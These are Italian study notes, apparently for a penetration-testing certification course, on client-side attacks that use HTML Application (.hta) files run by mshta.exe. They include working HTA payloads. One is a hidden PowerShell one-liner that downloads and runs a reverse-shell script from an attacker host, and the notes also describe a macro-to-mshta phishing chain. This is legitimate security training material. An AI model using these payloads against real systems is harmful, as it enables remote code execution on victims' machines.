# 019 — HTML Applications (HTA) (Client-Side Attacks)

> **Modulo:** Client-Side Attacks · **Video:** 19/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [019_HTML Applications (HTA).txt](019_HTML Applications (HTA).txt) · [019_HTML Applications (HTA).srt](019_HTML Applications (HTA).srt)

## Concetti chiave

- **HTA** = HTML Application → file con **estensione `.hta`** contenente HTML + CSS + **JavaScript/VBScript**.
- Eseguiti da **`mshta.exe`** (Microsoft HTML Application Host), componente nativo Windows.
- **Fuori dalla sandbox del browser** → girano con i **privilegi dell'utente loggato**, possono accedere a filesystem, registry, eseguire ActiveX.
- Due vie di esecuzione: (1) **via Internet Explorer** che invoca `mshta.exe`; (2) **direttamente `mshta.exe <url|path>`**.
- IE necessario solo per il vettore browser-based; **`mshta.exe`** esiste su qualsiasi Windows moderno.
- **`new ActiveXObject("WScript.Shell")`** dentro JS dell'HTA → esecuzione comandi sistema.
- Trick stealth: `self.close()` per chiudere la finestra `mshta` dopo l'esecuzione del payload.

## Spiegazione approfondita

### Cos'è un HTA
- File standalone scritto in HTML/CSS/JS o VBScript.
- Estensione `.hta`. Eseguibile come app, non come pagina web.
- Eseguito da `mshta.exe` (path: `C:\Windows\System32\mshta.exe`).
- Privilegi: **utente corrente**, NON sandbox IE/Edge.
- Può istanziare ActiveX (WScript.Shell, Scripting.FileSystemObject, …).

### Vettori d'attacco
**A. Browser-based (Internet Explorer)**: utente visita `http://atk/poc.hta` → IE chiede "What do you want to do with poc.hta? Open / Save" → Open → prompt "This program will open outside Protected mode" → Allow → `mshta.exe` esegue. Funziona solo su IE (Edge Chromium NO; Edge legacy parziale).

**B. Direct invocation**: `mshta.exe http://atk/poc.hta` (o path locale) → bypassa il browser, funziona su qualsiasi Win10/11. Tipicamente invocato da una macro VBA, una shortcut, un LOLBin chain.

### HTA "Hello calc" minimo
```html
<html>
<head>
<script>
  var payload = "calc.exe";
  new ActiveXObject("WScript.Shell").Run(payload);
  self.close();   // chiude finestra mshta
</script>
</head>
<body>
<h1>HTA POC</h1>
</body>
</html>
```

### Hosting
```bash
# Su Kali, scrivere POC.hta in /var/www/html/
sudo systemctl start apache2
# o Python:
sudo python3 -m http.server 80
```

### Esecuzione dal target
- IE: `http://192.168.2.134/poc.hta` → Open → Allow → calc.exe pop.
- Run dialog (Win+R): `mshta.exe http://192.168.2.134/poc.hta`.

### Security context
- HTA gira come l'**utente** che ha avviato `mshta.exe`, NON come servizio IE.
- Se l'utente è in **local Administrators** ma UAC attivo → HTA gira in **medium integrity** (non admin). Per high integrity serve consent prompt o UAC bypass.

### `mshta.exe` LOLBin
- È un **binary trusted/signed Microsoft** → spesso permesso da application control (AppLocker base config).
- Frequente abuso in catene fileless: macro → `mshta http://atk/x.hta` → JS → `new ActiveXObject("WScript.Shell").Run("powershell ...")`.

### IE in ambienti enterprise
- Sebbene EOL ufficialmente, **Windows Enterprise** lo mantiene per compatibilità intranet apps → HTA browser-vector ancora valido in ambienti aziendali "legacy".

## Comandi & strumenti

| Elemento | Sintassi |
|---|---|
| Esecutore HTA | `mshta.exe <path|url>` |
| Path su Windows | `C:\Windows\System32\mshta.exe` |
| ActiveX shell in JS | `new ActiveXObject("WScript.Shell").Run("<cmd>")` |
| ActiveX FileSystemObject | `new ActiveXObject("Scripting.FileSystemObject")` |
| Chiudere mshta | `self.close();` (in JS) |
| Hosting Kali | `systemctl start apache2` (root in `/var/www/html/`) |
| Test URL | `http://<atk-ip>/poc.hta` |
| Direct invoke | `Win+R` → `mshta.exe http://atk/poc.hta` |

## Esempi pratici

```html
<!-- POC.hta con stealth + reverse shell PowerShell -->
<html><head>
<script>
  var sh = new ActiveXObject("WScript.Shell");
  sh.Run('powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://10.0.0.5/rev.ps1\')"', 0, false);
  self.close();
</script>
</head><body></body></html>
```

```html
<!-- Variante VBScript -->
<html><head>
<HTA:APPLICATION ID="ph" WINDOWSTATE="minimize" SHOWINTASKBAR="no" />
<script language="VBScript">
  Set sh = CreateObject("WScript.Shell")
  sh.Run "calc.exe", 0, False
  self.Close
</script>
</head></html>
```

```cmd
:: Direct exec da CMD/Run
mshta.exe http://192.168.2.134/poc.hta
```

## Punti d'attenzione per l'esame eCPPT

- **HTA** = `.hta` = HTML + CSS + JS/VBScript eseguito da **`mshta.exe`**.
- `mshta.exe` è un **LOLBin** nativo, spesso non bloccato → vettore favorito di phishing/initial access.
- Gira con privilegi dell'**utente corrente**, fuori dalla sandbox browser.
- **`new ActiveXObject("WScript.Shell").Run(...)`** = chiave per code execution dentro HTA JS.
- **`self.close()`** = chiude la finestra `mshta` dopo l'exec → stealth.
- Internet Explorer ancora rilevante in **Windows Enterprise** per HTA browser-vector.
- Su Win moderni: invocazione diretta `mshta.exe <url>` (anche remoto HTTP) funziona sempre.
- Spesso combinato in chain: **VBA macro → `Shell "mshta http://..."` → JS → PowerShell**.

## Collegamenti con altri video

- Precedente: [[018_Pretexting Phishing Documents]]
- Prossimo: [[020_HTA Attacks]] — reverse shell + integrazione VBA.
- ActiveX in Office: [[017_Using ActiveX Controls for Macro Execution]] (stessa famiglia COM).
- PowerShell payload backend: [[016_VBA Reverse Shell Macro with Powercat]].
- MacroPack supporta format `.hta`: [[021_Automating Macro Development with MacroPack - Part 1]].
